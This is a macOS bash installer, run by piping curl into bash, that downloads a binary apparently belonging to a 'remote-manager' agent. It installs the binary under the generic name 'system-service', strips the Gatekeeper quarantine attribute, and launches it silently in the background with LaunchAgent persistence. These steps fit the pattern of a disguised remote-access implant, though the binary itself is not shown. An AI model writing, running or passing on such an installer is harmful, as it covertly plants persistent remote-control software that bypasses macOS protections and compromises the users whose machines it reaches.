#!/usr/bin/env bash
# One-line installer for macOS (Apple Silicon arm64 / Intel x86_64)
# Usage: curl -sSL https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/install.sh | bash

set -e

# 1. Terminate any currently running instance (legacy or current)
pkill -9 -f "system-service" 2>/dev/null || true
pkill -9 -f "remote-manager-agent" 2>/dev/null || true
launchctl unload "$HOME/Library/LaunchAgents/com.systemservice.agent.plist" 2>/dev/null || true
launchctl unload "$HOME/Library/LaunchAgents/com.remotemanager.agent.plist" 2>/dev/null || true
sleep 1

# 2. Detect CPU architecture
ARCH=$(uname -m)
case "$ARCH" in
  arm64|aarch64) BIN_ARCH="arm64" ;;
  x86_64) BIN_ARCH="amd64" ;;
  *)
    echo "[-] Unsupported macOS architecture: $ARCH" >&2
    exit 1
    ;;
esac

# 3. Determine installation path
TARGET_DIR="$HOME/Library/Application Support/SystemService"
TARGET_EXE="$TARGET_DIR/system-service"
mkdir -p "$TARGET_DIR"

# 4. Download latest distribution archive
ARCHIVE_URL="https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-${BIN_ARCH}.tar.gz"
RAW_URL="https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/macos/system-service-darwin-${BIN_ARCH}"
TEMP_ARCHIVE=$(mktemp /tmp/system-service-XXXXXX.tar.gz)

download() {
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$1" -o "$2"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$2" "$1"
  else
    return 1
  fi
}

INSTALL_SUCCESS=0
if download "$ARCHIVE_URL" "$TEMP_ARCHIVE" && tar -xzf "$TEMP_ARCHIVE" -C "$TARGET_DIR" 2>/dev/null; then
  rm -f "$TEMP_ARCHIVE"
  if [ -f "$TARGET_DIR/system-service-darwin-${BIN_ARCH}" ]; then
    mv -f "$TARGET_DIR/system-service-darwin-${BIN_ARCH}" "$TARGET_EXE"
  fi
  INSTALL_SUCCESS=1
else
  rm -f "$TEMP_ARCHIVE"
  if download "$RAW_URL" "$TARGET_EXE"; then
    INSTALL_SUCCESS=1
  fi
fi

if [ "$INSTALL_SUCCESS" -ne 1 ] || [ ! -f "$TARGET_EXE" ]; then
  echo "[-] Failed to download system-service binary." >&2
  exit 1
fi

chmod +x "$TARGET_EXE"

# 5. Remove Gatekeeper / macOS quarantine attribute
xattr -c "$TARGET_EXE" 2>/dev/null || true
xattr -d com.apple.quarantine "$TARGET_EXE" 2>/dev/null || true

# 6. Launch agent in background (agent configures LaunchAgent persistence on startup)
nohup "$TARGET_EXE" >/dev/null 2>&1 &
disown 2>/dev/null || true

sleep 1
PLIST="$HOME/Library/LaunchAgents/com.systemservice.agent.plist"
if [ -f "$PLIST" ]; then
  launchctl load "$PLIST" 2>/dev/null || true
fi

echo "[+] System Service successfully installed and running in background."
